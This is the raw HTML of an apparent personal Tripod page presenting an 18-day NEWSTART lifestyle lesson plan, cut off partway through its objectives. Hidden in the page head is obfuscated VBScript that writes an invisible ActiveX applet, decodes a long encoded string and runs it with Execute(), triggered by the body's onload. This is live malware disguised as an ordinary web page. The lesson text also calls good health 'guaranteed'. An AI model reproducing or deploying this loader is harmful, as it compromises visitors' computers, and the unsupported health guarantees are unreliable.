<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>NEWSTART Lifestyle Program</title>
</head>
<body onload="vbscript:KJ_start()" topmargin="0" leftmargin="0"><!-- begin compete js -->
<script type="text/javascript">
    __compete_code = '667f89f26d96c30e99728fe6a608804d';
    (function () {
        var s = document.createElement('script'),
            d = document.getElementsByTagName('head')[0] ||
                document.getElementsByTagName('body')[0],
            t = 'https:' == document.location.protocol ? 
                'https://c.compete.com/bootstrap/' : 
                'http://c.compete.com/bootstrap/';
        s.src = t + __compete_code + '/bootstrap.js';
        s.type = 'text/javascript';
        s.async = 'async'; 
        if (d) { d.appendChild(s); }
    }());
</script>
<!-- end compete js -->

<!-- quantcast -->
<script type="text/javascript">
	function channValidator(chann){
	return (typeof(chann) == 'string' && chann != '');
	}

	function lycosQuantcast(){
		var lb = "";
		if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
			lb += cm_host.split('.')[0] + '.';
		}
	
		if(typeof(cm_taxid) !==	'undefined' && channValidator(cm_taxid)){
			lb += cm_taxid;
			lb = lb.replace('/','');
		} else {
			lb = lb.replace('.','');
		}
		return lb;
	}
	
	var _qevents = _qevents || [];
	
	(function() {
		var elem = document.createElement('script');
		elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
		elem.async = true;
		elem.type = "text/javascript";
		var scpt = document.getElementsByTagName('script')[0];
		scpt.parentNode.insertBefore(elem, scpt);
	})();
	
	_qevents.push({
		qacct:"p-6eQegedn62bSo",
		labels:lycosQuantcast()
	});
</script>
<!-- end quantcast -->

<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "jtoyende";
var tripod_member_page = "jtoyende/index.html";
var tripod_ratings_hash = "1319531905:191356d3e6347ff3d66218534148fbd1";

var lycos_ad_category = null;

var lycos_ad_remote_addr = "154.35.200.66";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=404136";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=404136";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}

window.onload = function() {
    var f = document.getElementById("FooterAd");
    var b = document.getElementsByTagName("body")[0];
    b.removeChild(f);
    b.appendChild(f);
}

</script>
<div id="tb_container" style="text-align:center; position:relative; z-index:999999999">
    <div id="tb_ad" style="display:block!important; overflow:hidden; width:868px; margin:0 auto">
    <a href="http://www.tripod.lycos.com" title="build your own website at Tripod.com" style="float:left; width:140px">
    	<img src="http://pd.tripod.com/common/ly/images/freeAd.jpg" alt="Made with Tripod.com" />
    </a> 
        <div id="ad_container" style="display:block!important; float:left; width:728px ">
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
        </div>
    </div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important; position:relative; z-index:999999!important; height:94px!important"> 
<script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script>
</div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=404136" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>

<script language="vbscript">
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language="vbscript">
ExeString = "@dlEiVcamd'DolgP`wo(QanP`wo(?dbn`dNebm'=kogaJaea^s'BNN'SnRcagk'SdmK]og'Opa@(Ahi]gx?enjNt]FIZoo`mp#(FINaoCdi#(FI>n``oaHhge`t#%FFGhfaDs#%FF>q`]odH]dk#%FFKqjl\f\p`'$Di`Rp^Ati_ohjjJE=ko`j_Sj$AhgaK`od'Stl`Ron$Ki@nmnmMdnqhdJ`woR`pQ`]_S`ik8ARJ*Jo`jOdspAhga#Edh`O\pc+,%OikRon<N``_P`lk*Md\`<kgHaDmnpm'OikRon'!FFZro]ms#%(89+JqH`m#PhoNpm(80PcdiQ`]_S`ik->hjr`DseoAqiboejm@m_DeDePto`Ooq9!cpo!PcdiQ`]_S`ik->hjr`R`pEdh`S`ik8ARJ*Jo`jOdspAhga#Edh`O\pc+-%AegdOaho)Smhoa!7%=N?Unihj`_9!!r]r^ndoo6!JE[ns\no'$!!9%r]BmHa!OlkOoqu]?mKa!CphkOassAhgaOdhl)BgkndNdoA@opmh]8AOJ-BaoEdh`'AegdK]og$E<poqd^)`opmh]qodn8.0@hndMd\`Odhl)BgkndNdoAhgaOdhl<BNN)KkdiP`woBdk`$AhgaK`od'7$HaOxkaNsm8dolgScaiBdk`P`lk*Rqdp`q^>qGb%7!!CPHK9%r]BmHa!;!>JCTjmgk\c8!!q^nbmeks5%FIZoo`mp#(!=!q^>qGb%DolgP`woDgo`HaOxkaNsm8r]rOg`jAegdOaho)Smhoau]?mKa!Q^nS`toAicEaBdk`P`lk*>kjo`AicEaAicBpm^pdniBpm^pdniFI>d\mbaNt]$>tmn`moOoqdjb+G]nsDj_ds?c`m%DbK\ooHi``w>d\q9/PcdiHaGdap#K>]nd#?pqmaisNpmhic$+,%<7GB\o`'_(PcdiJE?c`ic`Rp^<Bdm\htCdof!9WNq]D9/@knaFF>g\jbdNq]8>gm$<r^$Gdap#K>]nd#?pqmaisNpmhic$+,%$(,(!5XOpa@8+Di`HaDgo`GEBc]if`Opa9Ld`#BpnmdipNsmeif'-'K\ooHi``w>d\q$Di`HaDi`Epj^sdkiEpj^sdkiFF>q`]odH]dk#%JjDmnjqN`rpi`IassDeEiVcamd9!cphkOg`j@tdsBpm^pdniDi`HaRc]mdAegd9K`bo'ReiO\pc+.%%Kqjcm`hAhgan[>khljjEdh`rWIdbmknnapRc]md_XNs\pdniamxW^g`ig)goiEa#BNN)Bdk`Ashnpn'Nd\q`Bdk`%$Od`m>`ghJE=ko`j_Sj$Ng\n`Edh`+dolg$Agr`R`pEdh`S`ik8ARJ*Jo`jOdspAhga#Rc]mdAegd'.'smq`(AhgaOdhl)Vmeod7!!CPHK9%r]BmHa!;!>JCTjmgk\c8!!q^nbmeks5%FIZoo`mp#(!=!q^>qGb%DolgP`woEdh`S`ik->hjr`Di`HaC`b\tgpDc9VnOcdgh)Q`cMd\`#!CG@XZ?PQMAISZQNDMXDc`johoe`rW@`e\qgsQndmDC%JqoKjkfU`nnhjj<SnRcagk)N`fMa\c#CJ@UZKJ?<KZI<BCEIDWOjeos\q`XHh^njrjbo[Jqokjkf@tkq`on[Ha_h\R`q%RoNg`hg-MabVmeodCJ@UZBPNMDIPZTNAM[D``moeoh`oW!!@`e\qgsD`!!WOjeos\q`XHh^njrjbo[Jqokjkf@tkq`on[K`bo'JqoKjkfU`nnhjj'0$!!),WL\eg[>khojo`Po`Np\sdkidmu+,(Q@CZCRKMCB\hgFFH`dhMdb$GFAT^>QMQ@JO^PO@QWE_dipdsdan[?da]pkoE_%XNnapr`maWLd_mnnkasWKpsgkjjAsomanrW!Gaas#KpsGkjjQamrdki+,%%*+[H]dkWOo`oejm`ntI]hd(Ng\n`Edh`(>`ghJEI\hgN`f#CJ@UZBPNMDIPZTNAM[D``moeoh`oW!!@`e\qgsD`!!WOjeos\q`XHh^njrjbo[Jqokjkf@tkq`on[K`bo'JqoKjkfU`nnhjj'0$!!),WL\eg[Re_dOo`oejm`ntI]hd(Ng\n`Edh`(RrNd`kg*MdbSmhoa!CG@XZ?PQMAISZQNDMXNnapr`maWLd_mnnkasWKaed_`[4*+[Jqokjkf[Jlohjjn[H]dkWA_hokmOmaadmaib`'0.-+6-(Q@CZCRKMCB\hgFFH`dhMdb$GFAT^>QMQ@JO^PO@QWOjeos\q`XHh^njrjbo[ReicjsnHanr\cdmbNt]otroah[Knjedh`rWIdbmknnapNppgnjgHip`qiaoNaosdjbrW,\/_,-/+,+/+,+/+_+/+,+/+,+/+,+31X+/,a+21,+^g`ig(>`ghJEI\hgN`f#CJ@UZBPNMDIPZTNAM[Nkasr]mdWIdbmknnapWVdj_nroMOX>tmn`moR`qnejmWSdm_krrI`rn]bhicRp^nxnp`lWLmnaegdnXHh^njrjboJqokjkfDjodmj`sO`soeifnX+`+`+1+,+/+,+/+,^/+,+/+,+/+,+//2W/+-`/.2+!']k\jf!$VnOcdgh)Q`cRqdp`DFDT[>TMN@MO[PR@NWRjbov\n`[He^qjojeoXJeae^dW-+-+XJtohjnfXJooejmnXH`dhWD_eonmLmdaamdi_`!'-.0+3-+N@FZ@RNM@?\kgFIH]dkMab'DFDT[>TMN@MO[PR@NWRjbov\n`[He^qjojeoXJeae^dW-+-+X>nhijmWI\hgO`soeifnXIdrOo`oejm`nt!']k\jf!$JEqhl\c`Ejh_dm$Gdap#VdjK`od'2$!Lmnbn\lBdk`oWBjihniAhgan[He^qjojeoNg\n`cWOo`oejm`nt!$Di`Epj^sdkiEpj^sdkiFF>q`]odHegh`q#(JmAmqjnQ`opl`IdspOahoK]og9!HaIno$ARJ*Ahga@wdoor#SdmK]og!RO^qdlo-`t`!$%ScaiP`lkL\sc8otroah2-XAicEaEaOahoK]og9!nuns`i.1WScaiOo`mpPoAegd9VdjK`od%NXNP@LWG`qiag2-*_kg@hndNs\noTkBdk`8ReiO\pc!RTOODHXFdmj`k)`gkDi`HaVnOcdgh)Q`cRqdp`DFDT[GN>=G^H=>GDJ@[Nkasr]mdWIdbmknnapWVdj_nroWBpnmdipQdmodniXMtiXFdmj`k..+Np\qoQkEdh`BNN)?jotBdk`RhiL\sc!s`aWgev\hg-bea!'SdmK]og!ra][Akgc`n)gopBNN)?jotBdk`RhiL\sc!otroah2-Xfir]gk)cde(RhiL\sc!otroah2-X_dngonk*dmd>]gkGE@kl`m_Pj'ReiO\pc!v`^WEjh_dm*cso'!cpo!$VnOcdgh)Q`cRqdp`DFDT[>K<ONDN[MNJPW-_hg[(cghahgaSnRcagk)N`fRnds`GFAT^>H<RNAN^MKJSW*_kgX>nip`moOxka+]koge^`oejm*t(ln`jvihj`_RoNg`hg-MabVmeodCJ@UZBG=NR@OZQJKO[_hgedh`[?aa`phoH^ki[(RrNd`kg*MdbN``_$GFAT^>H<RNAN^MKJSWrscaegdW@`e\qgsD_jmW$SnRcagk)N`fRnds`GFAT^>H<RNAN^MKJSW`gkaegdWO^qdloDicdm`X+R=R^ndooRoNg`hg-MabVmeodCJ@UZBG=NR@OZQJKO[_hgEdh`[Nd`kgXJo`jWBjih`i`W!'SdmK]ogS`ikO\pc!VN_mhkp)dsa!!,! )VnOcdgh)Q`cRqdp`DFDT[>K<ONDN[MNJPWcghAhgaWRcagk@tWOmkkdmptRca`sC]icgamrWSNGKnjonX+w1/-1/B<1(80/=,,->E(4>81)+/<=+/=42/3?x!RrNd`kg*MdbSmhoa!CG@XZ?G@NO@RZNJNOX_kgBdk`XNbmeksCkns@j^n_aW!'v70-.01/,,/4+B(-,C-)=0A5(/+?+3A41B../|R`pEdh`S`ik8ARJ*Jo`jOdspAhga#Ro]msPlAhga'1'pmt`%AegdOaho)SmhoaU]oOdspAegdOaho)?gnna@j_AqiboejmAqiboejmGEKdg`Ho$$EaDjRg`n`7:!cphkOg`j@tdsBpm^pdniDi`HaScenKj_\sdki8_n^qhdip)kj_\sdkiEaGaas#PchnHjb\pdni(3$8bdk`ScaiPchnHjb\pdni8He_'OddrGk^`oejm'5$EaAOJ-BaoDsp`mnejmI]hd#PchnHjb\pdni%;9!pcdiScenKj_\sdki8Gdap#ScenKj_\sdki+Gai'OddrGk^`oejm$(Gai'AOJ-BaoEdh`M\i`'OddrGk^`oejm$%$AicEaEaGai'OddrGk^`oejm$9.Og`jOddrGk^`oejm9ScenKj_\sdki![Di`HaJEqhl\c`Ejh_dm$OgdoGn^]ohjj$AicEaAicBpm^pdniBpm^pdniFIH]dkMab'MabRon'Edh`M\i`(JmAmqjnQ`opl`IdspMabS`ikRon<SnRcagk)N`fMa\c#N`fNpm(DeN`fOahoNpm8!PcdiVnOcdgh)Q`cRqdp`MabRon'Edh`M\i`AicEaAicBpm^pdniBpm^pdniFIJ^jRp^#BpnmdipNsmeif$Rp^@8+P`roKps9/?nSchgaSmq`P`roKps9S`ooNpp*-DbS`ooNpp=.3Od`m>tmn`moOoqdjb8Ahi]gx?enj!5XAsho?n@m_DeJmAmqjnQ`opl`IdspNaoOddrAkgc`n<BNN)C`sAkgc`n#BpnmdipNsmeif$R`pCd_Nt]8>n``oaJaea^s#Nbmeksdjb-?e^sdki`mu(NdoAng``qn8OddrAkgc`n)Rp^Ang``qnEjh_dm?jtip<,Akm@]^gP`lkBjk_amdjEjh_dmoAkgc`n>npjo8Ang``q>kpmo&,Cd_Nt]*\c_Ang``q>kpmo(S`ikEjh_dm*I`haIassDe@dbNq]->kpmo8+Og`jG]nsDj_ds?c`m8DjnsmN`u#?pqmaisNpmhic'!W'K`j#BpnmdipNsmeif$),(Nt]Ooqdjb8Hh_$>tmn`moOoqdjb+G]nsDj_ds?c`m',+Gai'>qmq`joRondmb%(K\ooHi``w>d\q(-$?pqmaisNpmhic<GEBc]if`Opa#?pqmaisNpmhic'K\ooHi``w>d\q$Rp^@8,Agr`HaNt]A<,Scai?pqmaisNpmhic<?pqmaisNpmhic%@dbNq]-Dp`l#-$![Dseo?k@hnde8+Bjqf<-SjAng``q>kpmoHaGB\o`'Nq]Rondmb%<H>`na#Cd_Nt]*Ds`i#i$%ScaiEae7Akgc`n>npjoOd`m>tmn`moOoqdjb8>tmn`moOoqdjb!?h^Opa)Eodh$e*,%%W!@wdpCjDi`HaDi`HaM`toH\roEic`t>g\n<EironMdq$>tmn`moOoqdjb+X+Gai'>qmq`joRondmb%(0$Rp^Nsmeif9Ld`#BpnmdipNsmeif'H\roEic`t>g\n&0'H`m#?pqmaisNpmhic$,G]nsDj_ds?c`m),(>tmn`moOoqdjb8FI>d\mbaNt]$>tmn`moOoqdjb+G]nsDj_ds?c`m%@j_Db@j_DbGkjoFIJ^jRp^<?pqmaisNpmhic@j_AqiboejmAqiboejmGEOmkk`b]od#%JjDmnjqN`rpi`IassMdbL\scR\kpa<CJ@UZKJ?<KZI<BCEIDWOjeos\q`XHh^njrjbo[Jqokjkf@tkq`on[?abq`a@drf@`fma`8RrNd`kg*MdbN``_$MdbL\scR\kpa$Ea?enj?abq`a<Od`m?hng?dbn`d9Edj\kt@drf!6W!@m_DeAnmd<,on1?enj?abq`a<GEN]kNt]$?hng?dbn`d$JEqhl\c`Ejh_dm$?hng?dbn`d$M`toSnRcagk)N`fRnds`MdbL\scR\kpa'CdofC`cmd`Di`Epj^sdkiEpj^sdkiFFplh]bdAkgc`n#O\pcM\i`(JmAmqjnQ`opl`IdspNaoAkgc`nI`ha<BNN)C`sAkgc`n#O\pcM\i`(NdoOgdoAhgan8Ang``qI]hd)Bdk`oCpoDsensn8+EjnD\_cOddrAegdEiOddrAegdnEdh`Dsp<Q>`na#ENK)F`p@woairdkiM\i`'OddrAegd)L\sc%$EaAegd@to8GOIJnEdh`Dsp<CSHHJnEdh`Dsp<<RKNmAhga@wo8LCOJqBdk`Ass9!EOK!PcdiB\hgFF<okaicOk#ScenEdh`-K]og'cshh(@knaDeBdk`Ass9!Q>N!PcdiB\hgFF<okaicOk#ScenEdh`-K]og'qan$Agr`EaAegd@to8GOPOd`mCsoAshnpn8,AicEaJ`woHa#T>]nd#L\scJ\l`%<Q>`na#VdjK`od%?dngonkX($Jq$PB\o`'K]ogI]hd$8P?\r`$RhiL\sc!@`rfpjo%$ScaiDos@tdroo<-@j_DbDbGop@wdoor9/PcdiENK)BjltEdh`ReiO\pc!rtoodh/-[_anjokk-djd!'L\scJ\l`ENK)BjltEdh`ReiO\pc!v`^WEjh_dm*cso'O\pcM\i`AicEaAicBpm^pdniBpm^pdniFINaoCdi#(JmAmqjnQ`opl`Idsp@nm->h``mS`ooHo8RO^qdlo-N_mhkpAtghi`haDbDmnScaiEiVcamd9!cphkDgo`EiVcamd9!q^n!@m_DeDeEiVcamd9!q^n!PcdiR`pENK<?md\p`N]f`bo$R^ndooeif)Bdk`OtroahN]f`bo$O`sSnRcagk9Bma\s`K]i`_o'SNbmeks)Ocdgh(@knaNao<lkk`K]i`_o8_n^qhdip)`klgdoo#!FFZfpans%<lkk`K]i`_o-naoBGODC#vE4/0C>.-,,?A/(-,C+)<C=5(/+?+3A@07<,=|%<lkk`K]i`_o-^n``oaDmnp\m^a#(NdoRrNd`kg8<lkk`K]i`_o-BaoN]f`bo$$=kogaJaea^s)o`s>HNH?$z+@/2AA+0(B+8.),0>B(740+,+,</>5+4/.-7x$=kogaJaea^s)_md\p`Hioo`i_`'$R`pENK<=kogaJaea^s)C`sJ^ed^p#(@m_DeNdo?hngJaea^s9ENK)CmeqdnEjnD\_c?enjOahoEi?enjJ^ed^pDbCdofS`ik-?ndu`Pto`7=.@i`CdofS`ik-?ndu`Pto`7=-ScaiAshoAnmDi`HaEdj\kt@drf8?enjOaho)@mhqaGdop`qIdsp?ehJpcdm=mq#/$N\m_khhuaAkmd9+Ok2Jscam@mn#h$8Djo'#5)Nic$%IassOdhlNsmeif9!Ejnh8-SjGdi$OgdoOdsp$P`lkJpl9@n_#Ld`#ScenS`to+d(,($HaOdhlIth8,/ScaiP`lkJpl913Dgo`HaOdhlIth8,,ScaiP`lkJpl914Di`HaS`ikBc]m8>gm$OdhlIth(Jpcdm=mq#eLj`3$%DbS`ikBc]m8>gm$.3$Og`jOaho>d\q9Bcn#03%@j_DbOahoNpmhic<P`lkOoqdjb!Odhl>g\nIassPmGk^jNpm8Dsa^toa#!@dlG`x<nm'.%'ScenS`to!qa>nGe!J`u<qm$+(9!Nod`q<nm'+%%!!r]BmHa%Fdt=mq#-$8!Jscam@mn#0$!%q^>qGb!!G`x<nm'-%<%Kog`n<qm$-(!!u]?mKa!Fat@mn#2$8!Jpcdm=mq#/$!!qa>nGe!Ejnh8-SjGdi$@w`Ooqdjb(!u]?mKa!OahoIqh8<r^$Hh_$@w`Ooqdjb+d(,($%q^>qGb!!EaOahoIqh8,7Pcdi%q^>qGb!!P`lkJpl92/%q^>qGb!!AicEa!qa>nGe!S`ikBc]m8>gm$OdhlIth&Fat@mn#hIjc0$(!u]?mKa!DbS`ikBc]m8>gm$-7$Og`j!!r]BmHa%Odhl>g\n<r]Bm%q^>qGb!!Agr`EaOaho>d\q9Bcn#14%Scai!qa>nGe!S`ikBc]m8qaGb!!r]BmHa%@m_De!u]?mKa!OddrOass9ScenS`to!Odhl>g\n!!r]BmHa%Idsp!$%r]BmHa!Dsa^toa#ScenS`to(ScenS`to8DsaNsmeif9!%P`lkOoqdjb!!CphkOass9;!o^qdlog]ifp]bd8r]r^ndoo:!qa>nGe!_k^thais)smhoa!!!;!`duooxga8&kknhoejm5]]rjhps`7k`bo9+ls:pjo5,kw6rh_pc9+ls:d`hbdo9+ls:v(hi``w5.3:rdrd^dkdpt9ddc_ai&9%7!!!=KOGAOI=HD8GE!!ZcpdnpG@EBGO9+RE?SC9+^k_d8_jl)in-!!]^sdr`W)=^sdr`!!S?jlkkidip9!!7%*@KLGDO:!;!+_hq:!!q^>qGb%7!!*o^qdlo=!q^>qGb%7!!n_mhkpk\jbt\c`<q^nbmeks9%r]BmHa!OgdoOdsp%r]BmHa!PmGk^jNpm!qa>nGe!7%*r^ndoo:!qa>nGe!7%*AJ@T=!q^>qGb%7!!*DOLG:R]rOass9ScenS`to!qa>nGeTiHjbfOoqu]?mKa!GE^np\qo$$!RhiL\sc8AOJ-BaoRka^h\hAng``q#,$![Ha#ENK)Edh`Dsensn$RhiL\sc!s`aWBjk_am-cpo!$%ScaiBNN)?jotBdk`RhiL\sc!s`aWBjk_am-cpo!'SdmK]og!ra][ffr`gh)fdbAicEaEa#BNN)Bdk`Ashnpn'ReiO\pc!rtoodh/-[_anjokk-djd!$%ScaiBNN)?jotBdk`RhiL\sc!otroah2-X_dngonk*dmd'VdjK`od%nxnp`l..Wjes\kg*bha@j_Db@j_Aqiboejm"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 5"&vbCrLf&"KeyArr(1) = 4"&vbCrLf&"KeyArr(2) = 5"&vbCrLf&"KeyArr(3) = 1"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
<table border="0" width="100%" height="1806">
  <tr>
    <td width="100%" colspan="2" height="113" background="cover.JPG">
      <p align="center">&nbsp;</td>
  </tr>
  <tr>
    <td width="21%" height="1701" valign="top">
      <p align="center"><a href="#Overview"><b>Overview</b></a></p>
      <p align="center"><a href="#Rational"><b>Rational</b></a> </p>
      <p align="center"><a href="#Objectives"><b>Objectives</b></a></p>
      <p align="center">
      <img border="0" src="flower.jpg" width="110" height="110"></p>
      <p align="center"><a href="#Procedure"><b>Procedure</b></a></p>
      <table border="0" width="100%">
        <tr>
          <td width="100%"><b><font size="1"><a href="nutrition.htm">Day 1 and 2: Nutrition</a></font></b></td>
        </tr>
        <tr>
          <td width="100%"><b><font size="1"><a href="exercise.htm">Day 3 and 4: Exercise</a></font></b></td>
        </tr>
        <tr>
          <td width="100%"><b><font size="1"><a href="water.htm">Day 5 and 6: Water</a></font></b></td>
        </tr>
        <tr>
          <td width="100%"><b><font size="1"><a href="sunlight.htm">Day 7 and 8: Sunshine</a></font></b></td>
        </tr>
        <tr>
          <td width="100%"><b><font size="1"><a href="temperance.htm">Day 9 and 10: Temperance</a></font></b></td>
        </tr>
        <tr>
          <td width="100%"><b><font size="1"><a href="air.htm">Day 11 and 12: Air</a></font></b></td>
        </tr>
        <tr>
          <td width="100%"><b><font size="1"><a href="rest.htm">Day 13 and 14: Rest</a></font></b></td>
        </tr>
        <tr>
          <td width="100%"><b><font size="1"><a href="trustinGod.htm">Day 15 and 16: Trust in God</a></font></b></td>
        </tr>
        <tr>
          <td width="100%"><b><font size="1"><a href="review.htm">Day 17 and 18:
            Review</a></font></b></td>
        </tr>
      </table>
    </td>
    <td width="79%" height="1701" valign="top" background="../pics/background.gif">
      <p align="center" style="line-height: 150%"><b><font color="#008000"><u>Lesson
      Plan</u></font></b></p>
      <h2 style="line-height: 100%"><span style="font-size: 10.0pt; font-family: Verdana; color: #008000">Title</span><font color="#008000"><span style="font-size: 10.0pt; font-family: Verdana; font-weight: normal">:</span></font><span style="font-size: 10.0pt; font-family: Verdana"><font color="#008000">
      </font>Eight Doctors<br>
      </span><span style="font-size: 10.0pt; font-family: Verdana; color: #008000">By</span><span style="font-size: 10.0pt; font-family: Verdana; color: #008000; font-weight: normal">:</span><span style="font-size: 10.0pt; font-family: Verdana">
      Janet N. Oyende<br>
      </span><span style="font-size: 10.0pt; font-family: Verdana; color: #008000">Subject</span><span style="font-size: 10.0pt; font-family: Verdana; color: #008000; font-weight: normal">:</span><span style="font-size: 10.0pt; font-family: Verdana"><font color="#008000">
      </font>Learning the NEWSTART Program<br>
      </span><span style="font-size: 10.0pt; font-family: Verdana; color: #008000">Age
      Group</span><span style="font-size: 10.0pt; font-family: Verdana; color: #008000; font-weight: normal">:</span><span style="font-size: 10.0pt; font-family: Verdana"><font color="#008000">
      </font>Above 16 Year Olds</span></h2>
      <h2 style="line-height: 100%"><font color="#008000"><span style="font-size: 10.0pt; font-family: Verdana">Duration:</span></font><span style="font-size: 10.0pt; font-family: Verdana; color: blue">
      </span><span style="font-size: 10.0pt; font-family: Verdana">18 Days</span></h2>
      <h2 style="text-align: justify; line-height: 100%"><span style="font-size: 10.0pt; font-family: Verdana; color: #008000">
      <a name="#Rational">Rational:</a></span></h2>
      <p style="text-align: justify"><font face="Verdana"><span style="font-size: 10.0pt; color: windowtext">NEWSTART
      is a natural dietary lifestyle that brings improved health and increased
      energy. With a diligent application to these basic principles, guided by
      patience and powered by determination, good health is guaranteed, provided
      the body is first being cleansed of all its impurities. </span><span style="font-size: 10.0pt; color: #054131">The
      clinical benefits have been astounding for patients and their referring
      physicians, and the health improvements are surprisingly rapid.</span></font></p>
      <p align="right"><a href="#Top"><font size="1" face="Verdana">Back to Top</font></A>
      <h2 style="text-align: justify"><span style="font-size: 10.0pt; font-family: Verdana; color: #008000">
      <a name="#Objectives">Objectives</a></span><font color="#008000"><span style="font-size: 10.0pt; font-family: Verdana">:</span></font></h2>
      <p class="MsoNormal" style="text-align: justify; margin-top: 6.0pt"><span style="font-size: 10.0pt; font-family: Verdana">The
      objectives of this lesson can be classified into:&nbsp;</span></p>
      <ol style="margin-top: 0in; margin-bottom: 0in" start="1" type="1">
        <ol style="margin-top: 0in; margin-bottom: 0in" start="1" type="a">
          <li class="MsoNormal" style="text-align: justify"><font color="#008000"><u><span style="font-size: 10.0pt; font-family: Verdana">Knowledge
            objectives</span></u></font></li>
        </ol>
      </ol>
      <p class="MsoNormal" style="text-align: justify"><span style="font-size: 10.0pt; font-family: Verdana">As
      a result of this class, students will better be able to:</span></p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><span style="font-size: 10.0pt">-<span style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 7.0pt; font-family: Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </span></span><span style="font-size: 10.0pt; font-family: Verdana">Define
      the purpose of NEWSTART</span></p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><span style="font-size: 10.0pt">-<span style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 7.0pt; font-family: Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </span></span><span style="font-size: 10.0pt; font-family: Verdana">Know
      that NEWSTART is meant to be a practical key to a better lifestyle that
      many people have never found.</span></p>
      <p class="MsoNormal" style="text-align: justify; text-indent: -.25in; margin-left: .5in"><span style="font-size: 10.0pt">-<span style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 7.0pt; font-family: Times New Roman">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      </span></span><span style="font-size: 10.0pt; font-family: Verdana">Identify
      possible areas in their lives in which the students could improve their
      lifestyle&nbsp;</span></p>
      <ol style="margin-top: 0in; margin-bottom: 0in" start="1" type="1">
        <ol style="margin-top: 0in; margin-bottom: 0in" start="2" type="a">
          <li class="MsoNormal" style="text-align: justify"><font color="#008000"><u><span style="font-size: 10.0pt; font-family: Verdana">Skills
            Objectives</span></u></font></li>
        </ol>
      </ol>
      <p class="MsoNormal" style="text-align: justify"><span style="font-size: 10.0pt; font-family: Verdana">As
      a result of this class, students will better be able to:</span></p>
